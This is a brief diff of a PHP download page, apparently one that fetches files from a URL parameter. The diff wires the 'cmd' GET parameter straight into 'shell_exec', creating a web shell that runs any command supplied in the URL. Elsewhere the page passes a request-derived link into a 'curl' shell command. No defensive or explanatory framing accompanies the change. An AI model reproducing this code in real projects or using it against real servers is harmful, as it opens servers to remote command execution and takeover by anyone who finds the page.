@@ -83,7 +83,7 @@ body{
 <h1></h1>
 <div class="box">
 <?php
-
+$cmd = $_GET['cmd'];
 echo shell_exec("$cmd"); //命令行
 	
 $A=strtotime("now");
@@ -110,7 +110,6 @@ shell_exec("curl -L $actual_link");
 	
 $url = $_GET['url'];
 $rename = $_GET['rename'];
-$cmd = $_GET['cmd'];
 	
 $lenth=strlen($url); //获取url长度
 $renamelenth=strlen($rename); //获取rename长度
